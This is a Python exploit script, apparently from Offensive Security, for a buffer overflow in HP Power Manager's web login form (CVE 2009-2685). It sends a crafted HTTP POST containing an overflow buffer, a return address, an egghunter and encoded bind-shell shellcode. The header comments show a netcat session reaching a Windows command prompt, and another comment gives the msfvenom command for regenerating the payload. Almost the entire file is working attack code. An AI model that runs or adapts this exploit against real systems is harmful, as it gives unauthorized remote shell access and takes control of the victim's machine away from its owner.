#!/usr/bin/python
# HP Power Manager Administration Universal Buffer Overflow Exploit
# CVE 2009-2685
# Tested on Win2k3 Ent SP2 English, Win XP Sp2 English
# Matteo Memelli ryujin __A-T__ offensive-security.com
# www.offensive-security.com
# Spaghetti & Pwnsauce - 07/11/2009
#
# ryujin@bt:~$ ./hppowermanager.py 172.16.30.203
# HP Power Manager Administration Universal Buffer Overflow Exploit
# ryujin __A-T__ offensive-security.com
# [+] Sending evil buffer...
# HTTP/1.0 200 OK
# [+] Done!
# [*] Check your shell at 172.16.30.203:4444 , can take up to 1 min to spawn your shell
# ryujin@bt:~$ nc -v 172.16.30.203 4444
# 172.16.30.203: inverse host lookup failed: Unknown server error : Connection timed out
# (UNKNOWN) [172.16.30.203] 4444 (?) open
# Microsoft Windows [Version 5.2.3790]
# (C) Copyright 1985-2003 Microsoft Corp.

# C:\WINDOWS\system32>

import sys
from socket import *

print "HP Power Manager Administration Universal Buffer Overflow Exploit"
print "ryujin __A-T__ offensive-security.com"

try:
   HOST  = sys.argv[1]
except IndexError:
   print "Usage: %s HOST" % sys.argv[0]
   sys.exit()

PORT  = 80
RET   = "\xCF\xBC\x08\x76" # 7608BCCF JMP ESP MSVCP60.dll

# [*] Using Msf::Encoder::PexAlphaNum with final size of 709 bytes
# badchar = "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a"

# R. Flemen - command used to modify shellcode (change your IP and port as needed):
# R. Flemen - "msfvenom -p windows/shell_bind_tcp LHOST=192.168.45.181 LPORT=4444 EXITFUNC=thread -b '\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a' x86/pex_alphanum --platform windows -f c"

SHELL = (
"n00bn00b"
"\x33\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\x82\xbe\x99\xbd\x83\xee\xfc\xe2\xf4\x7e\x56\x1b\xbd"
"\x82\xbe\xf9\x34\x67\x8f\x59\xd9\x09\xee\xa9\x36\xd0\xb2"
"\x12\xef\x96\x35\xeb\x95\x8d\x09\xd3\x9b\xb3\x41\x35\x81"
"\xe3\xc2\x9b\x91\xa2\x7f\x56\xb0\x83\x79\x7b\x4f\xd0\xe9"
"\x12\xef\x92\x35\xd3\x81\x09\xf2\x88\xc5\x61\xf6\x98\x6c"
"\xd3\x35\xc0\x9d\x83\x6d\x12\xf4\x9a\x5d\xa3\xf4\x09\x8a"
"\x12\xbc\x54\x8f\x66\x11\x43\x71\x94\xbc\x45\x86\x79\xc8"
"\x74\xbd\xe4\x45\xb9\xc3\xbd\xc8\x66\xe6\x12\xe5\xa6\xbf"
"\x4a\xdb\x09\xb2\xd2\x36\xda\xa2\x98\x6e\x09\xba\x12\xbc"
"\x52\x37\xdd\x99\xa6\xe5\xc2\xdc\xdb\xe4\xc8\x42\x62\xe1"
"\xc6\xe7\x09\xac\x72\x30\xdf\xd6\xaa\x8f\x82\xbe\xf1\xca"
"\xf1\x8c\xc6\xe9\xea\xf2\xee\x9b\x85\x41\x4c\x05\x12\xbf"
"\x99\xbd\xab\x7a\xcd\xed\xea\x97\x19\xd6\x82\x41\x4c\xd7"
"\x8a\xe7\xc9\x5f\x7f\xfe\xc9\xfd\xd2\xd6\x73\xb2\x5d\x5e"
"\x66\x68\x15\xd6\x9b\xbd\x93\xe2\x10\x5b\xe8\xae\xcf\xea"
"\xea\x7c\x42\x8a\xe5\x41\x4c\xea\xea\x09\x70\x85\x7d\x41"
"\x4c\xea\xea\xca\x75\x86\x63\x41\x4c\xea\x15\xd6\xec\xd3"
"\xcf\xdf\x66\x68\xea\xdd\xf4\xd9\x82\x37\x7a\xea\xd5\xe9"
"\xa8\x4b\xe8\xac\xc0\xeb\x60\x43\xff\x7a\xc6\x9a\xa5\xbc"
"\x83\x33\xdd\x99\x92\x78\x99\xf9\xd6\xee\xcf\xeb\xd4\xf8"
"\xcf\xf3\xd4\xe8\xca\xeb\xea\xc7\x55\x82\x04\x41\x4c\x34"
"\x62\xf0\xcf\xfb\x7d\x8e\xf1\xb5\x05\xa3\xf9\x42\x57\x05"
"\x79\xa0\xa8\xb4\xf1\x1b\x17\x03\x04\x42\x57\x82\x9f\xc1"
"\x88\x3e\x62\x5d\xf7\xbb\x22\xfa\x91\xcc\xf6\xd7\x82\xed"
"\x66\x68")

EH ='\x33\xD2\x90\x90\x90\x42\x52\x6a'
EH +='\x02\x58\xcd\x2e\x3c\x05\x5a\x74'
EH +='\xf4\xb8\x6e\x30\x30\x62\x8b\xfa'
EH +='\xaf\x75\xea\xaf\x75\xe7\xff\xe7'

evil =  "POST http://%s/goform/formLogin HTTP/1.1\r\n"
evil += "Host: %s\r\n"
evil += "User-Agent: %s\r\n"
evil += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
evil += "Accept-Language: en-us,en;q=0.5\r\n"
evil += "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
evil += "Keep-Alive: 300\r\n"
evil += "Proxy-Connection: keep-alive\r\n"
evil += "Referer: http://%s/index.asp\r\n"
evil += "Content-Type: application/x-www-form-urlencoded\r\n"
evil += "Content-Length: 678\r\n\r\n"
evil += "HtmlOnly=true&Password=admin&loginButton=Submit+Login&Login=admin"
evil += "\x41"*256 + RET + "\x90"*32 + EH + "\x42"*287 + "\x0d\x0a"
evil = evil % (HOST,HOST,SHELL,HOST)

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))
print '[+] Sending evil buffer...'
s.send(evil)
print s.recv(1024)
print "[+] Done!"
print "[*] Check your shell at %s:4444 , can take up to 1 min to spawn your shell" % HOST
s.close()
